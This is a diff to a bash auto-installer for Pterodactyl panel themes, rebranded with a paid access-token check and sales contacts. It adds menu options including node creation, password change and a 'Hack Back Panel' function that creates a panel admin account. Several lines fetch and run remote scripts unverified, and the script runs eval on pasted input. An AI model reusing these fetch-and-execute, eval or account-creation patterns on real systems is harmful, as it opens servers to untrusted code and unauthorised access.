@@ -12,20 +12,18 @@ display_welcome() {
   echo -e ""
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "${BLUE}[+]                                                 [+]${NC}"
-  echo -e "${BLUE}[+]                Auto Installer Tema             [+]${NC}"
-  echo -e "${BLUE}[+]                  © Skyzodev - 2024                [+]${NC}"
+  echo -e "${BLUE}[+]                AUTO INSTALLER THEMA             [+]${NC}"
+  echo -e "${BLUE}[+]                  © SKYZOPEDIA                [+]${NC}"
   echo -e "${BLUE}[+]                                                 [+]${NC}"
-  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "${RED}[+] =============================================== [+]${NC}"
   echo -e ""
   echo -e "script ini di buat untuk mempermudah penginstalasian thema pterodactyle,"
-  echo -e "dilarang keras untuk memperjual belikan."
+  echo -e "Dilarang Keras Share Bebas."
   echo -e ""
-  echo -e "Telegram :"
-  echo -e "https://t.me/skyzodev"
-  echo -e "Youtube :"
-  echo -e "https://www.youtube.com/@skyzooffc"
-  echo -e "Credits By :"
-  echo -e "https://github.com/Foxstoree"
+  echo -e "𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 :"
+  echo -e "@skyzodev"
+  echo -e "𝗖𝗥𝗘𝗗𝗜𝗧𝗦 :"
+  echo -e "@skyzopedia"
   sleep 4
   clear
 }
@@ -58,17 +56,20 @@ install_jq() {
 check_token() {
   echo -e "                                                       "
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
-  echo -e "${BLUE}[+]               LICENSY SKYZO OFFC             [+]${NC}"
+  echo -e "${BLUE}[+]               LICENSY RAFATHAR CODE            [+]${NC}"
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
-
   echo -e "${YELLOW}MASUKAN AKSES TOKEN :${NC}"
   read -r USER_TOKEN
 
   if [ "$USER_TOKEN" = "skyzodev" ]; then
     echo -e "${GREEN}AKSES BERHASIL${NC}}"
   else
-    echo -e "${GREEN}AKSES GAGAL${NC}"
+    echo -e "${GREEN}Token Salah! Beli Kode Token Di Skyzopedia${NC}"
+    echo -e "${YELLOW}TELEGRAM : @skyzodev${NC}"
+    echo -e "${YELLOW}WHATSAPP : +6285624297893${NC}"
+    echo -e "${YELLOW}HARGA TOKEN : 25K FREE UPDATE JIKA ADA TOKEN BARU${NC}"
+    echo -e "${YELLOW}© Skyzopedia${NC}"
     exit 1
   fi
   clear
@@ -91,15 +92,15 @@ install_theme() {
     read -r SELECT_THEME
     case "$SELECT_THEME" in
       1)
-        THEME_URL=$(echo -e "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x44\x49\x54\x5A\x5A\x31\x31\x32\x2F\x66\x6F\x78\x78\x68\x6F\x73\x74\x74\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x43\x32\x2E\x7A\x69\x70")
+        THEME_URL=$(echo -e "https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/stellar.zip")
         break
         ;;
       2)
-        THEME_URL=$(echo -e "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x44\x49\x54\x5A\x5A\x31\x31\x32\x2F\x66\x6F\x78\x78\x68\x6F\x73\x74\x74\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x43\x31\x2E\x7A\x69\x70")
+        THEME_URL=$(echo -e "https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/billing.zip")
         break
         ;;
       3)
-        THEME_URL=$(echo -e "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x69\x74\x68\x75\x62\x2E\x63\x6F\x6D\x2F\x44\x49\x54\x5A\x5A\x31\x31\x32\x2F\x66\x6F\x78\x78\x68\x6F\x73\x74\x74\x2F\x72\x61\x77\x2F\x6D\x61\x69\x6E\x2F\x43\x33\x2E\x7A\x69\x70")
+        THEME_URL=$(echo -e "https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/enigma.zip")
         break
         ;; 
       x)
@@ -132,7 +133,7 @@ if [ "$SELECT_THEME" -eq 1 ]; then
   php artisan migrate
   yarn build:production
   php artisan view:clear
-  sudo rm /root/C2.zip
+  sudo rm /root/stellar.zip
   sudo rm -rf /root/pterodactyl
 
   echo -e "                                                       "
@@ -142,7 +143,7 @@ if [ "$SELECT_THEME" -eq 1 ]; then
   echo -e ""
   sleep 2
   clear
-  return
+  exit 0
 
 elif [ "$SELECT_THEME" -eq 2 ]; then
   echo -e "                                                       "
@@ -160,7 +161,7 @@ elif [ "$SELECT_THEME" -eq 2 ]; then
   php artisan migrate
   yarn build:production
   php artisan view:clear
-  sudo rm /root/C1.zip
+  sudo rm /root/billing.zip
   sudo rm -rf /root/pterodactyl
 
   echo -e "                                                       "
@@ -202,7 +203,7 @@ elif [ "$SELECT_THEME" -eq 3 ]; then
   php artisan migrate
   yarn build:production
   php artisan view:clear
-  sudo rm /root/C3.zip
+  sudo rm /root/enigma.zip
   sudo rm -rf /root/pterodactyl
 
   echo -e "                                                       "
@@ -225,7 +226,7 @@ uninstall_theme() {
   echo -e "${BLUE}[+]                    DELETE THEME                 [+]${NC}"
   echo -e "${BLUE}[+] =============================================== [+]${NC}"
   echo -e "                                                       "
-  bash <(curl https://raw.githubusercontent.com/Foxstoree/pterodactyl-auto-installer/main/repair.sh)
+  bash <(curl https://raw.githubusercontent.com/VallzHost/installer-theme/main/repair.sh)
   echo -e "                                                       "
   echo -e "${GREEN}[+] =============================================== [+]${NC}"
   echo -e "${GREEN}[+]                 DELETE THEME SUKSES             [+]${NC}"
@@ -234,7 +235,211 @@ uninstall_theme() {
   sleep 2
   clear
 }
+install_themeSteeler() {
+#!/bin/bash
 
+echo -e "                                                       "
+echo -e "${BLUE}[+] =============================================== [+]${NC}"
+echo -e "${BLUE}[+]                  INSTALLASI THEMA               [+]${NC}"
+echo -e "${BLUE}[+] =============================================== [+]${NC}"
+echo -e "                                                                   "
+
+# Unduh file tema
+wget -O /root/stellar.zip https://github.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/raw/main/stellar.zip
+
+
+# Ekstrak file tema
+unzip /root/stellar.zip -d /root/pterodactyl
+
+# Salin tema ke direktori Pterodactyl
+sudo cp -rfT /root/pterodactyl /var/www/pterodactyl
+
+# Instal Node.js dan Yarn
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
+sudo apt install -y nodejs
+sudo npm i -g yarn
+
+# Instal dependensi dan build tema
+cd /var/www/pterodactyl
+yarn add react-feather
+php artisan migrate
+yarn build:production
+php artisan view:clear
+
+# Hapus file dan direktori sementara
+sudo rm /root/stellar.zip
+sudo rm -rf /root/pterodactyl
+
+echo -e "                                                       "
+echo -e "${GREEN}[+] =============================================== [+]${NC}"
+echo -e "${GREEN}[+]                   INSTALL SUCCESS               [+]${NC}"
+echo -e "${GREEN}[+] =============================================== [+]${NC}"
+echo -e ""
+sleep 2
+clear
+exit 0
+
+}
+create_node() {
+  echo -e "                                                       "
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "${BLUE}[+]                    CREATE NODE                     [+]${NC}"
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  #!/bin/bash
+#!/bin/bash
+
+# Minta input dari pengguna
+read -p "Masukkan nama lokasi: " location_name
+read -p "Masukkan deskripsi lokasi: " location_description
+read -p "Masukkan domain: " domain
+read -p "Masukkan nama node: " node_name
+read -p "Masukkan RAM (dalam MB): " ram
+read -p "Masukkan jumlah maksimum disk space (dalam MB): " disk_space
+read -p "Masukkan Locid: " locid
+
+# Ubah ke direktori pterodactyl
+cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }
+
+# Membuat lokasi baru
+php artisan p:location:make <<EOF
+$location_name
+$location_description
+EOF
+
+# Membuat node baru
+php artisan p:node:make <<EOF
+$node_name
+$location_description
+$locid
+https
+$domain
+yes
+no
+no
+$ram
+$ram
+$disk_space
+$disk_space
+100
+8080
+2022
+/var/lib/pterodactyl/volumes
+EOF
+
+  echo -e "                                                       "
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "${GREEN}[+]        CREATE NODE & LOCATION SUKSES             [+]${NC}"
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  sleep 2
+  clear
+  exit 0
+}
+uninstall_panel() {
+  echo -e "                                                       "
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "${BLUE}[+]                    UNINSTALL PANEL                 [+]${NC}"
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+
+
+bash <(curl -s https://pterodactyl-installer.se) <<EOF
+y
+y
+y
+y
+EOF
+
+
+  echo -e "                                                       "
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "${GREEN}[+]                 UNINSTALL PANEL SUKSES             [+]${NC}"
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  sleep 2
+  clear
+  exit 0
+}
+configure_wings() {
+  echo -e "                                                       "
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "${BLUE}[+]                    CONFIGURE WINGS                 [+]${NC}"
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  #!/bin/bash
+
+# Minta input token dari pengguna
+read -p "Masukkan token Configure menjalankan wings: " wings
+
+eval "$wings"
+# Menjalankan perintah systemctl start wings
+sudo systemctl start wings
+
+  echo -e "                                                       "
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "${GREEN}[+]                 CONFIGURE WINGS SUKSES             [+]${NC}"
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  sleep 2
+  clear
+  exit 0
+}
+hackback_panel() {
+  echo -e "                                                       "
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "${BLUE}[+]                    HACK BACK PANEL                 [+]${NC}"
+  echo -e "${BLUE}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  # Minta input dari pengguna
+read -p "Masukkan Username Panel: " user
+read -p "password login " psswdhb
+  #!/bin/bash
+cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }
+
+# Membuat lokasi baru
+php artisan p:user:make <<EOF
+yes
+hackback@gmail.com
+$user
+$user
+$user
+$psswdhb
+EOF
+  echo -e "                                                       "
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "${GREEN}[+]                 AKUN TELAH DI ADD             [+]${NC}"
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  sleep 2
+  
+  exit 0
+}
+ubahpw_vps() {
+  echo -e "                                                       "
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "${GREEN}[+]                    UBAH PASSWORD VPS       [+]${NC}"
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+read -p "Masukkan Pw Baru: " pw
+read -p "Masukkan Ulang Pw Baru " pw
+
+passwd <<EOF
+$pw
+$pw
+
+EOF
+
+
+  echo -e "                                                       "
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "${GREEN}[+]                 GANTI PW VPS SUKSES         [+]${NC}"
+  echo -e "${GREEN}[+] =============================================== [+]${NC}"
+  echo -e "                                                       "
+  sleep 2
+  
+  exit 0
+}
 # Main script
 display_welcome
 install_jq
@@ -242,16 +447,35 @@ check_token
 
 while true; do
   clear
-  echo -e "                                                       "
-  echo -e "${BLUE}[+] =============================================== [+]${NC}"
-  echo -e "${BLUE}[+]                   SELECT OPTION                 [+]${NC}"
-  echo -e "${BLUE}[+] =============================================== [+]${NC}"
-  echo -e "                                                       "
-  echo -e "SELECT OPTION :"
+  echo -e "                                                                     "
+  echo -e "${RED}        _,gggggggggg.                                     ${NC}"
+  echo -e "${RED}    ,ggggggggggggggggg.                                   ${NC}"
+  echo -e "${RED}  ,ggggg        gggggggg.                                 ${NC}"
+  echo -e "${RED} ,ggg'               'ggg.                                ${NC}"
+  echo -e "${RED}',gg       ,ggg.      'ggg:                               ${NC}"
+  echo -e "${RED}'ggg      ,gg'''  .    ggg       Auto Installer Skyzopedia   ${NC}"
+  echo -e "${RED}gggg      gg     ,     ggg      ------------------------  ${NC}"
+  echo -e "${RED}ggg:     gg.     -   ,ggg       • Telegram : Skyzopedia      ${NC}"
+  echo -e "${RED} ggg:     ggg._    _,ggg        • Creadit  : Skyzopedia  ${NC}"
+  echo -e "${RED} ggg.    '.'''ggggggp           • Support by Skyzopedia  ${NC}"
+  echo -e "${RED}  'ggg    '-.__                                           ${NC}"
+  echo -e "${RED}    ggg                                                   ${NC}"
+  echo -e "${RED}      ggg                                                 ${NC}"
+  echo -e "${RED}        ggg.                                              ${NC}"
+  echo -e "${RED}          ggg.                                            ${NC}"
+  echo -e "${RED}             b.                                           ${NC}"
+  echo -e "                                                                     "
+  echo -e "BERIKUT LIST INSTALL :"
   echo "1. Install theme"
   echo "2. Uninstall theme"
+  echo "3. Configure Wings"
+  echo "4. Create Node"
+  echo "5. Uninstall Panel"
+  echo "6. Stellar Theme"
+  echo "7. Hack Back Panel"
+  echo "8. Ubah Pw Vps"
   echo "x. Exit"
-  echo -e "Masukkan pilihan (1/2/x):"
+  echo -e "Masukkan pilihan 1/2/x:"
   read -r MENU_CHOICE
   clear
 
@@ -261,6 +485,24 @@ while true; do
       ;;
     2)
       uninstall_theme
+      ;;
+      3)
+      configure_wings
+      ;;
+      4)
+      create_node
+      ;;
+      5)
+      uninstall_panel
+      ;;
+      6)
+      install_themeSteeler
+      ;;
+      7)
+      hackback_panel
+      ;;
+      8)
+      ubahpw_vps
       ;;
     x)
       echo "Keluar dari skrip."
